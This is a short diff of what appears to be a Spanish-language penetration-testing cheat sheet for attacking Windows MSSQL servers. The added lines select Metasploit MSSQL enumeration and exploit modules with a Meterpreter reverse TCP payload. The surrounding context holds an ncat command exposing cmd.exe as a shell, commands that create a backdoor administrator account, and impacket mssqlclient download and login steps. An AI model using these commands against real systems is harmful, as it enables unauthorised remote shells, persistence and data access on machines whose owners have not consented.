@@ -82,6 +82,11 @@ ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
 	set CMD net user pwned pass000 /ADD
 	net localgroup administrators pwned /ADD
 	
+	Con credenciales:
+		use auxiliary/admin/mssql/mssql_enum
+		use exploit/windows/mssql/mssql_payload
+			set PAYLOAD windows/meterpreter/reverse_tcp
+	
 	wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
 	python mssqlclient.py -port 1433 -db BBDD USER:'PASS'@IP [-windows-auth]
 		select name from master.sys.databases
